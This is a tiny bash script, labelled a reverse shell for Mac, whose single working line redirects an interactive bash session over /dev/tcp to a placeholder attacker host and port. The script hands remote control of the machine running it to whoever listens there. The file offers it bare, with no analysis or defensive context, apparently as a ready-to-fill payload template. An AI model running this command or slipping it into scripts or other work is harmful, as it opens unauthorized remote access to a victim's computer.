#!/bin/bash
# revshell - reverse shell for Mac

LHOST="LHOST"
LPORT=LPORT

bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
